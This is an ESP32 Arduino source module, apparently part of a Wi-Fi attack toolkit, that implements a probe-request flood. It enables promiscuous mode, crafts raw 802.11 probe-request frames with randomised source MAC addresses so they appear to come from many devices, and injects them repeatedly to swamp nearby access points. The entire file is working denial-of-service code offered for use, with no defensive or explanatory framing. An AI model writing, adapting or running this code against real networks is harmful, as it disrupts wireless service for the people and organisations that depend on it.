#include "Attack_Probe.h"
#include <WiFi.h>
#include "esp_wifi.h"

// Random MAC address generator (Probe requests should appear to come from different devices)
static void getRandomMac(uint8_t *mac) {
    mac[0] = 0x02; 
    mac[1] = random(256); mac[2] = random(256);
    mac[3] = random(256); mac[4] = random(256); mac[5] = random(256);
}

void StartProbeFlood() {
    WiFi.mode(WIFI_STA);
    // Promiscuous mode is required for packet injection
    esp_wifi_set_promiscuous(true);
}

void RunProbeFloodLoop() {
    // Probe Request Packet (Raw Byte Array)
    // This packet tells the modem, "I am here, let me in."
    uint8_t packet[128] = { 
        0x40, 0x00, 0x00, 0x00, // Type: Probe Request
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Dest: Broadcast
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source: (Random)
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // BSSID: Broadcast
        0x00, 0x00, // Seq Number
        0x00, 0x00, 0x09, 0x00, // Tag: SSID Parameter
        0x00 // SSID Length (0 = Wildcard)
    };
    
    // Randomize the source MAC address
    uint8_t rndMac[6]; 
    getRandomMac(rndMac);
    memcpy(&packet[10], rndMac, 6); 
    
    // Transmit the packet (TX)
    for(int i=0; i<2; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, packet, 26, true);
        delay(1); 
    }
    
    // Excessive speed can lock the modems or overheat the ESP.
    delay(5); 
}

void StopProbeFlood() {
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
}